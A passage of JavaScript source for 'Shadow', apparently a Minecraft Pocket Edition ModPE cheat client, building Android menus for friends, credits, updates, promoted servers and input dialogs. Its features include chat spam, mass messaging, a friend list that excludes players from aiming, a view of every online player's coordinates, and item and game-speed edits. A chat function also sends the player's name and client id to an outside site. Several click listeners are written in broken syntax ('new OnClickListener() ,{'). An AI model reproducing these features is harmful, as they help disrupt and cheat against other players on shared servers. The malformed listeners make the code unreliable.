onClick: function (v) {
var alert = new android.app.AlertDialog.Builder(MainActivity);
alert.setTitle("Shadow v1 changelog");
alert.setMessage(chnglog+"");
var dialog = alert.create();
dialog.show();
}
}));
oLayout.addView(updatess);

var sugg = new styleButton("Suggest mods", "Suggest mods to add to Shadow.");
sugg.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
var sest = new android.content.Intent(MainActivity);
sest.setAction(android.content.Intent.ACTION_VIEW);
sest.setData(android.net.Uri.parse("http://depresso.tk/suggest.php"));
MainActivity.startActivity(sest);
}
}));
oLayout.addView(sugg);

var f0 = new styleButton("Friend system", "Add a friend by name to not aim at them.");
f0.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
others.dismiss();
fsys();
}
}));
oLayout.addView(f0);

/*var f1 = new styleButton("Add friend", "Add a friend by name to not aim at them.");
f1.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
others.dismiss();
setFriend("name", "Add friend");
}
}));
oLayout.addView(f1);

var f2 = new styleButton("Remove friend", "Remove a friend by name.");
f2.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
others.dismiss();
rmFriend("name", "Remove friend");
}
}));
oLayout.addView(f2);

var f3 = new styleButton("Friend list", "View a list of your added friends.");
f3.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
var alert = new android.app.AlertDialog.Builder(MainActivity);
alert.setTitle("Your friends list");
alert.setMessage(pList.join(",\n"));
var dialog = alert.create();
dialog.show();
}
}));
oLayout.addView(f3);*/

var tut = new styleButton("Tutorials", "View the latest tutorials by Inferno.");
tut.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (v) {
var alert = new android.app.AlertDialog.Builder(MainActivity);
alert.setTitle("Shadow tutorials");
alert.setMessage(tutorialz.join("\n"));
var dialog = alert.create();
dialog.show();
}
});
oLayout.addView(tut);

var spamy = new styleButton("Spam", "Spam a message in chat.");
if(spam)spamy.setTextColor(android.graphics.Color.GREEN);
if(!spam)spamy.setTextColor(btnText);
spamy.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
spam ? spam = false : spam = true;
if(spam) {
spamy.setTextColor(android.graphics.Color.GREEN);
spam = true;
others.dismiss();
doSpam("Message", "Seconds (default is 1)", "Spam");
} else {
spamy.setTextColor(android.graphics.Color.RED);
spam = false;
que = false;
}
}
}));
oLayout.addView(spamy);

var helpls = new styleButton("Check update", "Check for new Shadow updates.");
helpls.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
getUpdate();
}
}));
oLayout.addView(helpls);

var psv = new styleButton("Servers", "Promoted servers.");
psv.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (v) {
others.dismiss();
sjoin();
/*var alert = new android.app.AlertDialog.Builder(MainActivity);
alert.setTitle("Promoted servers");
alert.setMessage(domainz.join("\n"));
var dialog = alert.create();
dialog.show();*/
}
});
oLayout.addView(psv);

var ssa = new styleButton("Send to all", "Send a message to all players online.");
ssa.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
others.dismiss();
putTell("Message", "Send");
}
}));
oLayout.addView(ssa);

var tidate = new styleButton("Device time/date", "Access date/time settings.");
tidate.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
var datime = new android.content.Intent(MainActivity);
datime.setAction(android.provider.Settings.ACTION_DATE_SETTINGS);
MainActivity.startActivity(datime);
}
}));
oLayout.addView(tidate);

var delcid = new styleButton("Delete client id", "Delete your CID/Client id.");
delcid.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
Shadow.deleteCid();
}
}));
oLayout.addView(delcid);

var coip = new styleButton("Copy IP & port", "Copy the IP&Port of the current server you're on.");
coip.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
var ClipboardManager = android.content.ClipboardManager;
var clipboard = ctx.getSystemService(android.content.Context.CLIPBOARD_SERVICE);
var cdata = android.content.ClipData.newPlainText("Shadow "+Math.random(12 * 7), Server.getAddress()+":"+Server.getPort());
clipboard.setPrimaryClip(cdata);
android.widget.Toast.makeText(MainActivity, "Copied to clipboard.", 1)
.show();
}
}));
oLayout.addView(coip);

var connecty = new styleButton("Connection info", "View your ip, client id & more.");
connecty.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
/*others.dismiss();
connectz();*/
var cm = MainActivity.getSystemService(MainActivity.CONNECTIVITY_SERVICE);
var netinfo = cm.getActiveNetworkInfo();
var status1 = "none";
var state1 = "none";
var name1 = "none";
if(netinfo != null){
if(netinfo.isConnected()){
if(netinfo.type == 1)status1 = "Wifi";
if(netinfo.type == 0)status1 = "Data";
if(typeof(netinfo.extra) != "undefined")state1 = netinfo.state;
if(typeof(netinfo.extra) != "undefined")name1 = netinfo.extra;
}
} else {
status1 = "none";
state1 = "none";
name1 = "none";
}

var urname = "none";
if(getPlayerEnt() != 0)urname = Shadow.clean(Entity.getNameTag(getPlayerEnt()));
var worldDir = Level.getWorldDir()+"/"+Level.getWorldName();
var alert = new android.app.AlertDialog.Builder(MainActivity);
alert.setTitle("Connection info");
alert.setMessage("Network name: "+name1+"\nConnection: "+status1+"\nIP address: "+address+"\nProvider(ISP): "+isp+"\nISP Country: "+ispc+"\nISP State: "+isps+"\nStatus: "+state1+"\nAndroid version: "+android.os.Build.VERSION.RELEASE+"\nMCPE version: "+ModPE.getMinecraftVersion()+"\nClient id: "+Shadow.getClient()+"World directory: "+worldDir+"\nConnected to: "+Server.getAddress()+"\nLanguage: "+getLang+"\nName: "+urname+"\nEntity id: "+getPlayerEnt());
var dialog = alert.create();
dialog.show();
}
}));
oLayout.addView(connecty);

var quey = new styleButton("Server query", "Get a list of players & plugins on a server.");
quey.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
others.dismiss();
query("domain/ip", "port", "Query");
}
}));
/*oLayout.addView(quey);*/

var quey2 = new styleButton("IP query", "Domain/IP query for ISP details.");
quey2.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
others.dismiss();
query2("domain/ip", "Query");
}
}));
/*oLayout.addView(quey2);*/

if(mnuOri == 0)others = new android.widget.PopupWindow(oLayout1, android.widget.LinearLayout.LayoutParams.FILL_PARENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
if(mnuOri == 1)others = new android.widget.PopupWindow(oLayout1, MainActivity.getWindowManager().getDefaultDisplay().getWidth() / 2,MainActivity.getWindowManager().getDefaultDisplay().getHeight());

others.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

var bg = new android.graphics.drawable.GradientDrawable();	bg.setColor(background);
oLayout1.setBackgroundDrawable(bg);
oLayout1.setPadding(20, 0, 20, 0);

others.showAtLocation(MainActivity.getWindow()
.getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
}));
}

function credit() {
MainActivity.runOnUiThread(new java.lang.Runnable({
run: function () {

try {
var aLayout = new android.widget.LinearLayout(MainActivity);
var aScroll = new android.widget.ScrollView(MainActivity);
var aLayout1 = new android.widget.LinearLayout(MainActivity);
aLayout.setOrientation(android.widget.LinearLayout.VERTICAL);
aLayout1.setOrientation(android.widget.LinearLayout.VERTICAL);
aScroll.addView(aLayout);
aLayout1.addView(aScroll);

var exit = new styleButton();
exit.setText("Back");
exit.setTextColor(android.graphics.Color.RED);
exit.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (viewarg) {
credit1.dismiss();
mainMenu();
}
}));
aLayout.addView(exit);

var title = new android.widget.TextView(ctx);
title.setText("Shadow made by Inferno");
title.setTextSize(20);
title.setTextColor(android.graphics.Color.WHITE);
title.setGravity(android.view.Gravity.CENTER);
aLayout.addView(title);

var twitter = new styleButton();
twitter.setText("Twitter");
twitter.setTextColor(android.graphics.Color.CYAN);
twitter.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
var twi = new android.content.Intent(MainActivity);
twi.setAction(android.content.Intent.ACTION_VIEW);
twi.setData(android.net.Uri.parse("https://twitter.com/Inferno?s=09"));
MainActivity.startActivity(twi);
}
}));
aLayout.addView(twitter);

var discord = new styleButton();
discord.setText("Discord");
discord.setTextColor(android.graphics.Color.WHITE);
discord.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
var dis = new android.content.Intent(MainActivity);
dis.setAction(android.content.Intent.ACTION_VIEW);
dis.setData(android.net.Uri.parse("https://discord.gg/Fm29dG3"));
MainActivity.startActivity(dis);
}
}));
aLayout.addView(discord);

var gl = new styleButton();
gl.setText("Google+");
gl.setTextColor(android.graphics.Color.RED);
gl.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
var gol = new android.content.Intent(MainActivity);
gol.setAction(android.content.Intent.ACTION_VIEW);
gol.setData(android.net.Uri.parse("https://plus.google.com/communities/103695355587842948163"));
MainActivity.startActivity(gol);
}
}));
aLayout.addView(gl);

var yt = new styleButton();
yt.setText("Youtube");
yt.setTextColor(android.graphics.Color.WHITE);
yt.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
var tub = new android.content.Intent(MainActivity);
tub.setAction(android.content.Intent.ACTION_VIEW);
tub.setData(android.net.Uri.parse("https://www.youtube.com/user/Inferno"));
MainActivity.startActivity(tub);
}
}));
aLayout.addView(yt);

credit1 = new android.widget.PopupWindow(aLayout1, android.widget.LinearLayout.LayoutParams.FILL_PARENT, android.widget.LinearLayout.LayoutParams.FILL_PARENT);

credit1.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

var bg = new android.graphics.drawable.GradientDrawable();	bg.setColor(android.graphics.Color.BLACK);
aLayout1.setBackgroundDrawable(bg);
aLayout1.setPadding(20, 0, 20, 0);

credit1.showAtLocation(MainActivity.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
}));
}

function update(newupdate, changelog) {
MainActivity.runOnUiThread(new java.lang.Runnable({
run: function () {

try {
var uLayout = new android.widget.LinearLayout(MainActivity);
var uScroll = new android.widget.ScrollView(MainActivity);
var uLayout1 = new android.widget.LinearLayout(MainActivity);
uLayout.setOrientation(android.widget.LinearLayout.VERTICAL);
uLayout1.setOrientation(android.widget.LinearLayout.VERTICAL);
uScroll.addView(uLayout);
uLayout1.addView(uScroll);

var exit = new styleButton();
exit.setText("Exit");
exit.setTextColor(android.graphics.Color.RED);
exit.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (viewarg) {
updates.dismiss();
}
}));
uLayout.addView(exit);
if(typeof(changelog) == "undefined")changelog = "No changelog.";
var title = new android.widget.TextView(ctx);
title.setText("New update is here! "+newupdate);
title.setTextSize(20);
title.setTextColor(android.graphics.Color.WHITE);
title.setGravity(android.view.Gravity.CENTER);
uLayout.addView(title);

var linkz = new styleButton();
linkz.setText("Update");
linkz.setTextColor(android.graphics.Color.CYAN);
linkz.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
var myl = new android.content.Intent(MainActivity);
myl.setAction(android.content.Intent.ACTION_VIEW);
myl.setData(android.net.Uri.parse("https://Inferno.github.io/Shadow"));
MainActivity.startActivity(myl);
}
}));
uLayout.addView(linkz);

var clog = new android.widget.TextView(ctx);
clog.setText(changelog);
clog.setTextSize(20);
clog.setTextColor(android.graphics.Color.WHITE);
clog.setGravity(android.view.Gravity.CENTER);
uLayout.addView(clog);

updates = new android.widget.PopupWindow(uLayout1, android.widget.LinearLayout.LayoutParams.FILL_PARENT, android.widget.LinearLayout.LayoutParams.FILL_PARENT);

updates.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

var bg = new android.graphics.drawable.GradientDrawable();	bg.setColor(android.graphics.Color.parseColor("#92000000"));
uLayout1.setBackgroundDrawable(bg);
uLayout1.setPadding(20, 0, 20, 0);

updates.showAtLocation(MainActivity.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
}));
}

function fsys() {
MainActivity.runOnUiThread(new java.lang.Runnable({
run: function () {

try {
var fLayout = new android.widget.LinearLayout(MainActivity);
var fScroll = new android.widget.ScrollView(MainActivity);
var fLayout1 = new android.widget.LinearLayout(MainActivity);
fLayout.setOrientation(android.widget.LinearLayout.VERTICAL);
fLayout1.setOrientation(android.widget.LinearLayout.VERTICAL);
fScroll.addView(fLayout);
fLayout1.addView(fScroll);

var exit = new styleButton();
exit.setText("Exit");
exit.setTextColor(android.graphics.Color.RED);
exit.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (viewarg) {
fDialog.dismiss();
showMenuBtn();
}
}));
fLayout.addView(exit);

var list1 = new android.widget.LinearLayout(MainActivity);
list1.setOrientation(1);
var list2 = new android.widget.LinearLayout(MainActivity);
list2.setOrientation(1);

list1.setVisibility(android.view.View.GONE);
list2.setVisibility(android.view.View.VISIBLE);

var add = new styleButton("Add by name");
add.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
fDialog.dismiss();
setFriend("name", "Add friend");
}
}));

var remove = new styleButton("Remove by name");
remove.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
fDialog.dismiss();
rmFriend("name", "Remove friend");
}
}));

var online = new styleButton("Online players");
online.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
list2.setVisibility(android.view.View.GONE);
list1.setVisibility(android.view.View.VISIBLE);
}
}));

var friends = new styleButton("Friends");
friends.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
list1.setVisibility(android.view.View.GONE);
list2.setVisibility(android.view.View.VISIBLE);
}
}));

var params = new android.widget.LinearLayout.LayoutParams(android.widget.LinearLayout.LayoutParams.MATCH_PARENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, 1);
var params2 = new android.widget.LinearLayout.LayoutParams(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, 1);

var row0 = new android.widget.LinearLayout(MainActivity);
row0.setOrientation(0);
var shh = new android.widget.LinearLayout(MainActivity);
shh.setOrientation(0);
add.setLayoutParams(params);
remove.setLayoutParams(params);
online.setLayoutParams(params);
friends.setLayoutParams(params);
row0.addView(add);
row0.addView(remove);
shh.addView(online);
shh.addView(friends);
fLayout.addView(row0);
fLayout.addView(shh);
fLayout.addView(list1);
fLayout.addView(list2);

var arr1 = [];
for(var i = 0; i < Server.getAllPlayers().length; i++){
arr1.push([Server.getAllPlayerNames()[i]]);
}
arr1.forEach(function(entry, index){
var row1 = new android.widget.LinearLayout(MainActivity);
row1.setOrientation(0);
txt = new android.widget.TextView(ctx);
txt.setText(Shadow.clean(entry+"")+"");
txt.setTextSize(20);
txt.setTextColor(android.graphics.Color.WHITE);
txt.setLayoutParams(params);
txt.setGravity(android.view.Gravity.CENTER);
row1.addView(txt);
if(!Shadow.isFriend(Shadow.clean(entry+"")))var btn = new styleButton("➕");
if(Shadow.isFriend(Shadow.clean(entry+"")))var btn = new styleButton("✖");
btn.setLayoutParams(params2);
//btn.setGravity(android.view.Gravity.CENTER);
btn.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
if(Shadow.isFriend(Shadow.clean(entry+"")))Shadow.removeFriend(Shadow.clean(entry+""));
if(!Shadow.isFriend(Shadow.clean(entry+"")))Shadow.addFriend(Shadow.clean(entry+""));
}
}));
row1.addView(btn);
list1.addView(row1);
});

var arr2 = [];
for(var i = 0; i < pList.length; i++){
arr2.push([pList[i]]);
}
arr2.forEach(function(entry, index){
var row1 = new android.widget.LinearLayout(MainActivity);
row1.setOrientation(0);
txt2 = new android.widget.TextView(ctx);
txt2.setText(entry+"");
txt2.setTextSize(20);
txt2.setTextColor(android.graphics.Color.WHITE);
txt2.setLayoutParams(params);
txt2.setGravity(android.view.Gravity.CENTER);
row1.addView(txt2);
var btn2 = new styleButton("✖");
btn2.setLayoutParams(params2);
//btn2.setGravity(android.view.Gravity.CENTER);
btn2.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
Shadow.removeFriend(Shadow.clean(entry+""));
}
}));
row1.addView(btn2);
list2.addView(row1);
});

fDialog = new android.widget.PopupWindow(fLayout1, android.widget.LinearLayout.LayoutParams.FILL_PARENT, android.widget.LinearLayout.LayoutParams.FILL_PARENT);

fDialog.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

var bg = new android.graphics.drawable.GradientDrawable();	bg.setColor(android.graphics.Color.parseColor("#92000000"));
fLayout1.setBackgroundDrawable(bg);
fLayout1.setPadding(20, 0, 20, 0);

fDialog.showAtLocation(MainActivity.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
}));
}

function sjoin() {
MainActivity.runOnUiThread(new java.lang.Runnable({
run: function () {

try {
var jLayout = new android.widget.LinearLayout(MainActivity);
var jScroll = new android.widget.ScrollView(MainActivity);
var jLayout1 = new android.widget.LinearLayout(MainActivity);
jLayout.setOrientation(android.widget.LinearLayout.VERTICAL);
jLayout1.setOrientation(android.widget.LinearLayout.VERTICAL);
jScroll.addView(jLayout);
jLayout1.addView(jScroll);

var exit = new styleButton();
exit.setText("Exit");
exit.setTextColor(android.graphics.Color.RED);
exit.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (viewarg) {
jDialog.dismiss();
showMenuBtn();
}
}));
jLayout.addView(exit);

var params = new android.widget.LinearLayout.LayoutParams(android.widget.LinearLayout.LayoutParams.MATCH_PARENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, 1);

/*
var domainz = [];
var ipz = [];
var portz = [];
*/

var arr1 = [];
for(var i = 0; i < domainz.length; i++){
arr1.push([domainz[i]]);
}
arr1.forEach(function(entry, index){
var btn = new styleButton("Add "+domainz[arr1.indexOf(entry)]+":"+portz[arr1.indexOf(entry)], "Promoted server.");
btn.setLayoutParams(params);
//btn.setGravity(android.view.Gravity.CENTER);
btn.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
/*Server.joinServer(ipz[arr1.indexOf(entry)], parseInt(portz[arr1.indexOf(entry)]));*/
Shadow.addServer(domainz[arr1.indexOf(entry)], ipz[arr1.indexOf(entry)], portz[arr1.indexOf(entry)]);
Shadow.toast("Server added to the bottom of your list.");
}
}));
jLayout.addView(btn);
});

jDialog = new android.widget.PopupWindow(jLayout1, android.widget.LinearLayout.LayoutParams.FILL_PARENT, android.widget.LinearLayout.LayoutParams.FILL_PARENT);

jDialog.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

var bg = new android.graphics.drawable.GradientDrawable();	bg.setColor(android.graphics.Color.parseColor("#92000000"));
jLayout1.setBackgroundDrawable(bg);
jLayout1.setPadding(20, 0, 20, 0);

jDialog.showAtLocation(MainActivity.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
}));
}

function aList() {
MainActivity.runOnUiThread(new java.lang.Runnable({
run: function () {

try {
var aLayout = new android.widget.LinearLayout(MainActivity);
var aScroll = new android.widget.ScrollView(MainActivity);
var aLayout1 = new android.widget.LinearLayout(MainActivity);
aLayout.setOrientation(android.widget.LinearLayout.VERTICAL);
aLayout1.setOrientation(android.widget.LinearLayout.VERTICAL);
aScroll.addView(aLayout);
aLayout1.addView(aScroll);

var exit = new styleButton();
exit.setText("Exit");
exit.setTextColor(android.graphics.Color.RED);
exit.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (viewarg) {
aDialog.dismiss();
showMenuBtn();
}
}));
aLayout.addView(exit);

var params = new android.widget.LinearLayout.LayoutParams(android.widget.LinearLayout.LayoutParams.MATCH_PARENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, 1);

var arr1 = [];
for(var i = 0; i < Server.getAllPlayers().length; i++){
arr1.push([Server.getAllPlayerNames()[i]]);
}
arr1.forEach(function(entry, index){
txt = new android.widget.TextView(ctx);
txt.setText(Shadow.clean(entry+"")+" ("+Math.floor(Entity.getX(Server.getAllPlayers()[arr1.indexOf(entry)]))+", "+Math.floor(Entity.getY(Server.getAllPlayers()[arr1.indexOf(entry)]))+", "+Math.floor(Entity.getZ(Server.getAllPlayers()[arr1.indexOf(entry)]))+")");
txt.setTextSize(20);
txt.setTextColor(android.graphics.Color.WHITE);
txt.setLayoutParams(params);
txt.setGravity(android.view.Gravity.CENTER);
aLayout.addView(txt);
});

aDialog = new android.widget.PopupWindow(aLayout1, android.widget.LinearLayout.LayoutParams.FILL_PARENT, android.widget.LinearLayout.LayoutParams.FILL_PARENT);

aDialog.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

var bg = new android.graphics.drawable.GradientDrawable();	bg.setColor(android.graphics.Color.parseColor("#92000000"));
aLayout1.setBackgroundDrawable(bg);
aLayout1.setPadding(20, 0, 20, 0);

aDialog.showAtLocation(MainActivity.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
}));
}

var glom = "";
var dcDialog;
function ShadowChat() {
MainActivity.runOnUiThread(new java.lang.Runnable({
run: function () {

try {
var dcLayout = new android.widget.LinearLayout(MainActivity);
var dcScroll = new android.widget.ScrollView(MainActivity);
var dcLayout1 = new android.widget.LinearLayout(MainActivity);
dcLayout.setOrientation(android.widget.LinearLayout.VERTICAL);
dcLayout1.setOrientation(android.widget.LinearLayout.VERTICAL);
dcScroll.addView(dcLayout);
dcLayout1.addView(dcScroll);

var exit = new styleButton();
exit.setText("Exit");
exit.setTextColor(android.graphics.Color.RED);
exit.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (viewarg) {
dcDialog.dismiss();
showMenuBtn();
}
}));
dcLayout.addView(exit);

var msgs = new android.widget.TextView(MainActivity);
msgs.setText(glom);
msgs.setTextColor(android.graphics.Color.WHITE);

var msg = new styleInput();
msg.setText("");
msg.setHint("Send a message...");

var send = new styleButton("Send");
send.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v, msgs) {
final = msg.getText();
var name = Shadow.clean(Entity.getNameTag(getPlayerEnt()));
var test = Shadow.getClient()+":"+len;
var tkn = test.split(":");
urlToString('http://depresso.tk/simple_chat.php?a='+name+'&b="'+final+'"&c='+tkn[1]+':'+tkn[0], function(cont, error) {
glom = cont+"";
});
}
}));

var params = new android.widget.LinearLayout.LayoutParams(android.widget.LinearLayout.LayoutParams.MATCH_PARENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, 1);
var params2 = new android.widget.LinearLayout.LayoutParams(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, 1);

var brow = new android.widget.LinearLayout(MainActivity);
brow.setOrientation(0);

msg.setLayoutParams(params);
send.setLayoutParams(params);
msgs.setGravity(android.view.Gravity.LEFT);
brow.setGravity(android.view.Gravity.BOTTOM);

dcLayout.addView(msgs);
brow.addView(msg);
brow.addView(send);
dcLayout.addView(brow);

dcDialog = new android.widget.PopupWindow(dcLayout1, android.widget.LinearLayout.LayoutParams.FILL_PARENT, android.widget.LinearLayout.LayoutParams.FILL_PARENT, true);

dcDialog.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

var bg = new android.graphics.drawable.GradientDrawable();	bg.setColor(android.graphics.Color.parseColor("#92000000"));
dcLayout1.setBackgroundDrawable(bg);
dcLayout1.setPadding(20, 0, 20, 0);

dcDialog.showAtLocation(MainActivity.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
}));
}

/*
*
============
EditText / input dialogs
============
*
*/

function editFov(hint, button) {
ctx.runOnUiThread(new java.lang.Runnable() ,{
run: function () {
showMenuBtn();
try {
var editor = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
var input = new styleInput();
input.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
var Exit = new styleButton();
	layout.setOrientation(android.widget.LinearLayout.VERTICAL);
layout.addView(input);
layout.addView(Exit);
input.setText("");
input.setHint(hint);
Exit.setText(button);
Exit.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (view) {
final = input.getText();
if(typeof(parseInt(final)) == "number" && final >= 1 && final <= 120){
ModPE.setFov(final);
} else {
clientMessage("Invalid input.");
}
editor.dismiss();
}
});

editor = new android.widget.PopupWindow(layout, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, true);

editor.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

editor.showAtLocation(ctx.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
});
}

function editSpeed(hint, button) {
ctx.runOnUiThread(new java.lang.Runnable() ,{
run: function () {
showMenuBtn();
try {
var editor = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
var input = new styleInput();
input.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
var Exit = new styleButton();
				layout.setOrientation(android.widget.LinearLayout.VERTICAL);
layout.addView(input);
layout.addView(Exit);
input.setText("");
input.setHint(hint);
Exit.setText(button);
Exit.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (view) {
final = input.getText();
if(typeof(parseInt(final)) == "number"){
ModPE.setGameSpeed(final);
} else {
clientMessage("Invalid input.");
}
editor.dismiss();
}
});

editor = new android.widget.PopupWindow(layout, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, true);

editor.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

editor.showAtLocation(ctx.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
});
}

function give(hint, hint2, hint3, button) {
ctx.runOnUiThread(new java.lang.Runnable() ,{
run: function () {
showMenuBtn();
try {
var editor = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
var input = new styleInput();
input.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
var input2 = new styleInput();
input2.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
var input3 = new styleInput();
input3.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
var Exit = new styleButton();
				layout.setOrientation(android.widget.LinearLayout.VERTICAL);
layout.addView(input);
layout.addView(input2);
layout.addView(input3);
layout.addView(Exit);
input.setText("");
input.setHint(hint);
input2.setText("");
input2.setHint(hint2);
input3.setText("");
input3.setHint(hint3);
Exit.setText(button);
Exit.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (view) {
final = input.getText();
final2 = input2.getText();
final3 = input3.getText();
if(typeof(parseInt(final)) == "number" && typeof(parseInt(final2)) == "number" && typeof(parseInt(final3)) == "number"){
var id = parseInt(final);
var dam = parseInt(final3);
var amo = parseInt(final2);
//addItemInventory(id, dam, amo);
Player.addItemInventory(id, dam, amo);
//Entity.setCarriedItem(getPlayerEnt(), id, dam, amo);
let item = [-1, -1];
for (let i = 0; i < 10; i++) {
let dmg = Shadow.sortGive(id, Player.getInventorySlot(i));
if (dmg > item[0]) {
item[0] = dmg;
item[1] = i;
}
if (item[1] != -1)Player.setSelectedSlotId(item[1]);
}
} else {
clientMessage("Invalid input.");
}
editor.dismiss();
}
});

editor = new android.widget.PopupWindow(layout, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, true);

editor.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

editor.showAtLocation(ctx.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
});
}

function offhand(hint, hint2, hint3) {
ctx.runOnUiThread(new java.lang.Runnable() ,{
run: function () {
showMenuBtn();
try {
var editor = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
var input = new styleInput();
input.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
var input2 = new styleInput();
input2.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
var input3 = new styleInput();
input3.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
var Exit = new styleButton();
				layout.setOrientation(android.widget.LinearLayout.VERTICAL);
layout.addView(input);
layout.addView(input2);
layout.addView(input3);
layout.addView(Exit);
input.setText("");
input.setHint(hint);
input2.setText("");
input2.setHint(hint2);
input3.setText("");
input3.setHint(hint3);
Exit.setText("Submit");
Exit.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (view) {
final = input.getText();
final2 = input2.getText();
final3 = input3.getText();
if(typeof(parseInt(final)) == "number" && typeof(parseInt(final2)) == "number" && typeof(parseInt(final3)) == "number"){
Entity.setOffhandSlot(getPlayerEnt(), final, final3, final2);
} else {
clientMessage("Invalid input.");
}
editor.dismiss();
}
});

editor = new android.widget.PopupWindow(layout, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, true);

editor.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

editor.showAtLocation(ctx.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
